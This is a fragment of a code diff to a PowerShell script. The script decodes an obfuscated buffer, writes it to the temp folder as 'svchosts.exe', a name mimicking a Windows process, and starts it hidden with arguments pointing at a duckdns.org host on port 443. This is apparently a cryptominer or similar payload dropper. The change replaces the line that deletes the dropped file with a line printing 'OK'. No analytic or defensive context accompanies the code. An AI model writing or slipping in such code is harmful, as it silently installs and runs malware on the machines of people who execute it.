@@ -20,4 +20,4 @@ $buf = white -Key $orange -Data $yellow
 $temp = [IO.Path]::Combine($env:TEMP, "svchosts.exe")
 [IO.File]::WriteAllBytes($temp, $buf)
 Start-Process -FilePath $temp -ArgumentList "-o ontcfu.duckdns.org:443 --tls" -WindowStyle Hidden
-Remove-Item $temp -Force
+Write-Host "OK"
